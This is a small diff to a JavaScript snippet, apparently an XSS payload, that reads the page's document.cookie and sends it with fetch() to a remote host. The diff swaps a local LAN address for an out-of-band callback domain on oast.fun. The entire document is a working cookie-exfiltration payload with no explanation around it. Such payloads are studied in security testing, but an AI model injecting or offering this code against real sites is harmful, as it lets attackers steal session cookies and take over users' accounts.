@@ -1,5 +1,5 @@
 token = document.cookie
-url = "http://192.168.40.131:8086/prueba.txt?token="+token
+url = "http://cech5ed2vtc0000bnv1gg8ge1zeyyyyyb.oast.fun/?token="+token
 fetch(url, {
     method: 'GET'
 })
